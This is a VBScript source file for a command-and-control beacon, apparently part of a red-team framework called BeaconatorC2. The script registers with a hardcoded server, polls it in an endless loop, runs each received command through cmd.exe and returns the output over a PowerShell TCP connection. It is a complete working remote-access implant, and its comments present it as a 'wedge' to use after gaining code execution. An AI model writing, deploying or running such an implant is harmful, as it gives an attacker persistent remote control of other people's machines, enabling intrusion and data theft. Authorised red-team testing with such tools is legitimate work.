Option Explicit

' Simple VBS HTTP Beacon for BeaconatorC2
' Only use Beaconator scripts for legal and ethical testing and assessment purposes.
' Note that this is not the most practical for user hosts because it flashes a lot of prompts users will see. 
' However, it may still prove handy for scenarios where you have remote code execution on servers using VBS.
' For red teaming, I suggest using this script as a wedge, to then install a more robust Beaconator or AutoRMM payload. 

Dim serverIP
Dim serverPort
Dim encoding
Dim checkInInterval
Dim beaconID
Dim computerName


serverIP = "192.168.50.152"     ' Default server address
serverPort = 5074              ' Default server port
encoding = "plaintext"         ' Encoding strategy: plaintext or base64
checkInInterval = 15           ' Check‑in interval in seconds

' Logging helper

Sub WriteLogToFile(message)
    On Error Resume Next
    Dim fso, logfile
    Set fso = CreateObject("Scripting.FileSystemObject")
    Dim logPath
 
    logPath = fso.GetParentFolderName(WScript.ScriptFullName) & "\beacon.log"
    Set logfile = fso.OpenTextFile(logPath, 8, True) 
    logfile.WriteLine FormatDateTime(Now, 2) & " " & FormatDateTime(Now, 3) & " " & message
    logfile.Close
    Set logfile = Nothing
    Set fso = Nothing
    On Error GoTo 0
End Sub


Sub Log(message)
   
    On Error Resume Next
    If InStr(LCase(WScript.FullName), "cscript.exe") > 0 Then
        If Not (TypeName(WScript.StdOut) = "Nothing") Then
            WScript.StdOut.WriteLine message
        Else
            WScript.Echo message
        End If
    End If
    Call WriteLogToFile(message)
    On Error GoTo 0
End Sub

Sub ParseArguments()
    ' Allow overriding configuration via command line arguments.
    ' Args: 0=script name, 1=serverIP, 2=port, 3=encoding, 4=interval
    Dim args, count
    Set args = WScript.Arguments
    count = args.Count
    If count >= 1 Then serverIP = args(0)
    If count >= 2 Then serverPort = CInt(args(1))
    If count >= 3 Then encoding = LCase(args(2))
    If count >= 4 Then checkInInterval = CInt(args(3))
End Sub

Function GenerateBeaconID()
    ' Generate a short unique beacon ID.   
    Dim guid
    guid = CreateObject("Scriptlet.TypeLib").Guid
    guid = Replace(guid, "{", "")
    guid = Replace(guid, "}", "")
    guid = Replace(guid, "-", "")
    GenerateBeaconID = LCase(Left(guid, 8))
End Function

Function Base64Encode(strData)

    Dim objXML
    Dim objNode
    Set objXML = CreateObject("MSXML2.DOMDocument")
    Set objNode = objXML.createElement("base64")
    objNode.dataType = "bin.base64"
    objNode.nodeTypedValue = StrConv(strData, vbFromUnicode)
    Base64Encode = objNode.text
    Set objNode = Nothing
    Set objXML = Nothing
End Function

Function Base64Decode(strData)
  
    Dim objXML
    Dim objNode
    Set objXML = CreateObject("MSXML2.DOMDocument")
    Set objNode = objXML.createElement("base64")
    objNode.dataType = "bin.base64"
    objNode.text = strData
    Base64Decode = StrConv(objNode.nodeTypedValue, vbUnicode)
    Set objNode = Nothing
    Set objXML = Nothing
End Function

Function EncodeMessage(message)
   
    If LCase(encoding) = "base64" Then
        EncodeMessage = Base64Encode(message)
    Else
        EncodeMessage = message
    End If
End Function

Function DecodeMessage(message)
 
    If LCase(encoding) = "base64" Then
        On Error Resume Next
        Dim decoded
        decoded = Base64Decode(message)
        If Err.Number <> 0 Then
            decoded = message
            Err.Clear
        End If
        On Error GoTo 0
        DecodeMessage = decoded
    Else
        DecodeMessage = message
    End If
End Function

Function SendMessage(msg, expectResponse)
    ' Send a message to the management server via TCP CO PowerShell. 

    Dim shell, execObj, psScript, cmd, encodedMsg, ipLiteral, portLiteral
    On Error Resume Next
    encodedMsg = EncodeMessage(msg)

   
    encodedMsg = Replace(encodedMsg, "'", "''")

    ' Build the PowerShell script.   
	
    psScript = "$ip='" & serverIP & "';" & _
               "$port=" & serverPort & ";" & _
               "$msg='" & encodedMsg & "';" & _
               "$bytes=[System.Text.Encoding]::UTF8.GetBytes($msg);" & _
               "$client=New-Object System.Net.Sockets.TcpClient;" & _
               "$client.Connect($ip,[int]$port);" & _
               "$stream=$client.GetStream();" & _
               "$stream.Write($bytes,0,$bytes.Length);" & _
               "$stream.Flush();"

    If expectResponse Then
  
        psScript = psScript & _
            "$buffer=New-Object byte[] 4096;" & _
            "$count=$stream.Read($buffer,0,$buffer.Length);" & _
            "$response=[System.Text.Encoding]::UTF8.GetString($buffer,0,$count);" & _
            "$client.Close();" & _
            "Write-Output $response"
    Else
        
        psScript = psScript & _
            "$client.Close();"
    End If

 
	
    cmd = "powershell.exe -NoProfile -NonInteractive -Command " & Chr(34) & psScript & Chr(34)

    ' Execute PS. 
	
    Set shell = CreateObject("WScript.Shell")
    Set execObj = shell.Exec(cmd)
    If expectResponse Then
        
        Dim resp
        resp = ""
        Do While execObj.StdOut.AtEndOfStream = False
            resp = resp & execObj.StdOut.ReadLine() & vbCrLf
        Loop
        
        If Len(resp) > 0 Then resp = Left(resp, Len(resp) - 2)
        SendMessage = DecodeMessage(resp)
    Else
        SendMessage = ""
    End If
 
    If Not execObj.StdErr.AtEndOfStream Then
        Dim errLines, errLine
        errLines = ""
        Do While execObj.StdErr.AtEndOfStream = False
            errLine = execObj.StdErr.ReadLine()
            errLines = errLines & errLine & vbCrLf
        Loop
        If errLines <> "" Then
            Log "PowerShell error: " & errLines
        End If
    End If
    On Error GoTo 0
    Set execObj = Nothing
    Set shell = Nothing
End Function

Sub RegisterBeacon()
 
    Dim msg
    Dim response
    msg = "register|" & beaconID & "|" & computerName
    Log "Registering with message: " & msg
    If LCase(encoding) = "base64" Then
        Log "Encoded message: " & EncodeMessage(msg)
    End If
    response = SendMessage(msg, True)
    If response <> "" Then
        Log "Registration response: " & response
    End If
End Sub

Function RequestAction()
 
    Dim msg
    msg = "request_action|" & beaconID
    Log "Requesting action..."
    RequestAction = SendMessage(msg, True)
End Function

Sub SendCommandOutput(output)
 
    Dim msg
    msg = "command_output|" & beaconID & "|" & output
    Log "Sending command output (" & Len(output) & " characters)..."
    Call SendMessage(msg, False)
End Sub

Sub ProcessCommand(commandData)
 
    If commandData = "" Then Exit Sub
    Dim noCommand
    noCommand = False
    If LCase(commandData) = "no_pending_commands" Then noCommand = True
    If noCommand Then Exit Sub
    Log "Processing command: " & commandData
    Dim cmd
    If LCase(Left(commandData, Len("execute_command|"))) = "execute_command|" Then
        cmd = Mid(commandData, Len("execute_command|") + 1)
    ElseIf InStr(commandData, "|") = 0 Then
        cmd = commandData
    Else
        Log "Unknown command format: " & commandData
        Exit Sub
    End If
    Dim output
    output = ExecuteCommand(cmd)
    Call SendCommandOutput(output)
End Sub

Function ExecuteCommand(cmd)
 
    Dim shell
    Dim execObj
    Dim result
    Dim outText
    Dim errText
    Set shell = CreateObject("WScript.Shell")
    Set execObj = shell.Exec("%comspec% /c " & cmd)
    outText = ""
    errText = ""

    Do
        ' Read from StdOut
        If Not execObj.StdOut.AtEndOfStream Then
            outText = outText & execObj.StdOut.ReadAll
        End If
        ' Read from StdErr
        If Not execObj.StdErr.AtEndOfStream Then
            errText = errText & execObj.StdErr.ReadAll
        End If
        If execObj.Status = 1 And execObj.StdOut.AtEndOfStream And execObj.StdErr.AtEndOfStream Then Exit Do
        WScript.Sleep 100
    Loop
    If outText <> "" Then
        result = "STDOUT:" & vbCrLf & outText & vbCrLf
    Else
        result = ""
    End If
    If errText <> "" Then
        result = result & "STDERR:" & vbCrLf & errText & vbCrLf
    End If
    If result = "" Then
        result = "Command executed (exit code: " & execObj.ExitCode & ")"
    End If
    execObj.Terminate
    Set execObj = Nothing
    Set shell = Nothing
    ExecuteCommand = result
End Function

 

ParseArguments
beaconID = GenerateBeaconID()
computerName = CreateObject("WScript.Network").ComputerName
Log "Beacon ID: " & beaconID
Log "Computer: " & computerName
Log "Server: " & serverIP & ":" & serverPort
Log "Encoding: " & UCase(encoding)
Log "Check‑in interval: " & checkInInterval & " seconds"

RegisterBeacon

Do
    On Error Resume Next
    Dim action
    action = RequestAction()
    If action <> "" Then
        ProcessCommand action
    End If
    Log "Sleeping for " & checkInInterval & " seconds..."
    WScript.Sleep checkInInterval * 1000
    On Error GoTo 0
Loop
